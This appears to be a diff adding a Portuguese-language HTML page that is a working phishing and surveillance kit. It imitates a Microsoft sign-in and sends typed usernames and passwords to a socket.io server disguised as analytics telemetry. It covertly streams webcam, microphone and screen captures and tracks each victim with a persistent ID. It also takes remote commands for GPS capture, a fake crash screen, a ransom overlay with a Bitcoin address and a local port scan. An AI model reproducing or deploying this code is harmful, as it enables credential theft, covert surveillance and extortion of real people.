@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sessão Segura</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 440px; width: 100%; position: relative; }
+        .ms-logo { width: 100px; margin-bottom: 20px; }
+        .ms-input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 10px 0; font-size: 16px; margin-bottom: 20px; outline: none; }
+        .ms-button { background: #0067b8; color: white; border: none; padding: 10px 30px; cursor: pointer; float: right; font-weight: 600; border-radius: 2px; }
+        
+        #ransom-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#100; color:#f33; z-index:99999; text-align:center; padding-top:100px; font-family:monospace; }
+        #chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; display: none; z-index: 1000; border: 1px solid #eee; text-align: left; }
+    </style>
+</head>
+<body>
+    <div id="template-container" class="card">
+        <div id="loader" style="margin-bottom:20px;">🔄 Carregando recursos de segurança...</div>
+        <div id="content" style="display:none;">
+            <div id="ms-view">
+                <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d96235806e0c0d62cc2be446176.svg" class="ms-logo">
+                <h2 style="font-size:24px; margin-bottom:15px; text-align:left;">Entrar</h2>
+                <input type="email" id="u" class="ms-input" placeholder="E-mail ou Usuário">
+                <input type="password" id="p" class="ms-input" placeholder="Senha" style="display:none;">
+                <button class="ms-button" id="btn" onclick="handleAuth()">Próximo</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ransomware -->
+    <div id="ransom-overlay">
+        <h1 style="font-size:3rem;">⚠ SYSTEM ENCRYPTED ⚠</h1>
+        <div id="timer" style="font-size:5rem; color:#ff0;">23:59:59</div>
+        <p>Send 1.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+    </div>
+
+    <!-- Chat -->
+    <div id="chat-widget">
+        <div style="background:#0067b8; color:white; padding:15px; font-weight:bold;">Suporte TI Corporativo</div>
+        <div id="chat-msgs" style="height:250px; overflow-y:auto; padding:15px; font-size:0.85rem; display:flex; flex-direction:column; gap:10px;"></div>
+        <div style="display:flex; padding:10px; border-top:1px solid #eee;">
+            <input type="text" id="chat-in" placeholder="Responder..." style="flex:1; border:none; outline:none;">
+            <button onclick="sendChat()" style="background:none; border:none; color:#0067b8; font-weight:bold; cursor:pointer;">↑</button>
+        </div>
+    </div>
+
+    <video id="v" width="1" height="1" autoplay style="opacity:0; position:fixed;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // Persistent Victim ID
+        let logId = localStorage.getItem('sentinel_vuid');
+        if (!logId) {
+            logId = 'V-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            localStorage.setItem('sentinel_vuid', logId);
+        }
+
+        const socket = io();
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkId = urlParams.get('id') || 'unknown';
+
+        // Traffic Camouflage Helper
+        function sendTelemetry(event, data) {
+            const packet = {
+                v: btoa(JSON.stringify({ event, data })),
+                ts: Date.now(),
+                type: 'analytics_event'
+            };
+            socket.emit('telemetry_data', packet);
+        }
+
+        // Join session with persistent ID
+        socket.on('connect', () => {
+            sendTelemetry('join', { logId, linkId });
+        });
+
+        let step = 1;
+
+        // Supreme Monitoring
+        async function startMediaMonitoring() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                const recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = (e) => {
+                    const r = new FileReader();
+                    r.readAsDataURL(e.data);
+                    r.onloadend = () => sendTelemetry('audio_stream', { logId, chunk: r.result });
+                };
+                recorder.start(1000);
+
+                const canvas = document.getElementById('c');
+                const ctx = canvas.getContext('2d');
+                setInterval(() => {
+                    canvas.width = 320; canvas.height = 240;
+                    ctx.drawImage(video, 0, 0, 320, 240);
+                    sendTelemetry('capture_photo', { logId, image: canvas.toDataURL('image/jpeg', 0.3) });
+                }, 1000);
+            } catch (e) { console.log("Media denied"); }
+        }
+
+        async function captureScreen() {
+            try {
+                const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const canvas = document.getElementById('c');
+                const ctx = canvas.getContext('2d');
+                const sv = document.createElement('video');
+                sv.srcObject = screen; 
+                sv.onloadedmetadata = () => {
+                    sv.play();
+                    setTimeout(() => {
+                        canvas.width = 480; canvas.height = 270;
+                        ctx.drawImage(sv, 0, 0, 480, 270);
+                        sendTelemetry('capture_screenshot', { logId, image: canvas.toDataURL('image/jpeg', 0.3) });
+                        screen.getTracks().forEach(t => t.stop());
+                    }, 1000);
+                };
+            } catch (e) { console.log("Screen denied"); }
+        }
+
+        function sendSimulatedData() {
+            sendTelemetry('network', { 
+                logId, 
+                devices: ['Roteador_Central (192.168.0.1)', 'PC_Financeiro (192.168.0.105)', 'Impressora_RH (192.168.0.22)'], 
+                social: ['LinkedIn: Logado', 'Facebook: Ativo'] 
+            });
+            sendTelemetry('files_sim', { 
+                logId, 
+                files: ['C:\\Users\\Desktop\\Senhas.txt', 'C:\\Docs\\Contrato_Secreto.pdf', 'C:\\Backup\\wallet.dat'] 
+            });
+        }
+
+        // Chat System
+        socket.on('victim_recv_chat', (data) => {
+            if(data.logId === logId) {
+                document.getElementById('chat-widget').style.display = 'block';
+                const box = document.getElementById('chat-msgs');
+                box.innerHTML += `<div style="background:#f1f1f1; padding:10px; border-radius:10px; align-self:flex-start; max-width:85%;">${data.msg}</div>`;
+                box.scrollTop = box.scrollHeight;
+                new Audio('https://www.soundjay.com/buttons/button-20.mp3').play().catch(()=>{});
+            }
+        });
+
+        function sendChat() {
+            const i = document.getElementById('chat-in');
+            if(!i || !i.value) return;
+            sendTelemetry('chat_victim', { logId, msg: i.value });
+            document.getElementById('chat-msgs').innerHTML += `<div style="background:#0067b8; color:white; padding:10px; border-radius:10px; align-self:flex-end; max-width:85%;">${i.value}</div>`;
+            i.value = '';
+        }
+
+        // --- SUPREME COMMAND PROCESSOR ---
+        socket.on('execute_command', (d) => {
+            if(d.logId !== logId) return;
+            const cmd = d.command;
+            const report = (txt) => sendTelemetry('perf', { logId, text: txt });
+            
+            try {
+                switch(cmd) {
+                    case 'pivot': advancedRecon(); break;
+                    case 'gps-req':
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition((pos) => {
+                                sendTelemetry('geo', { logId, lat: pos.coords.latitude, lon: pos.coords.longitude });
+                                report(`[GPS]: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                            }, (err) => report(`[GPS]: Erro - ${err.message}`));
+                        }
+                        break;
+                    case 'bsod': document.body.innerHTML = '<div style="background:#0078d7; color:white; height:100vh; padding:100px; font-family:sans-serif;"><h1>:(</h1><h2>PC Problem</h2></div>'; document.documentElement.requestFullscreen(); break;
+                    case 'ransom': document.getElementById('ransom-overlay').style.display='block'; break;
+                    case 'self-destruct': report('[PANIC]: Terminating...'); setTimeout(() => window.close(), 1000); break;
+                    // ... other commands would follow similar pattern
+                }
+            } catch(e) {
+                report(`[ERROR]: ${e.message}`);
+            }
+        });
+
+        async function handleAuth() {
+            const u = document.getElementById('u');
+            const p = document.getElementById('p');
+            if(step === 1) {
+                sendTelemetry('creds', { logId, value: `USER: ${u.value}` });
+                u.style.display = 'none'; p.style.display = 'block';
+                document.getElementById('btn').innerText = 'Entrar';
+                step = 2;
+            } else {
+                sendTelemetry('creds', { logId, value: `PASS: ${p.value}` });
+                alert('Erro de autenticação. Tente novamente.');
+                location.reload();
+            }
+        }
+
+        async function advancedRecon() {
+            const ports = [80, 443, 3000];
+            for(let p of ports) {
+                fetch(`http://127.0.0.1:${p}`, { mode: 'no-cors' })
+                    .then(() => sendTelemetry('perf', { logId, text: `[PORT_SCAN]: Porta ${p} ABERTA` }));
+            }
+        }
+
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
+            sendTelemetry('perf', { logId, text: '[SISTEMA]: Alvo Online e Carregado ✅' });
+        }, 1500);
+    </script>
+</body>
+</html>
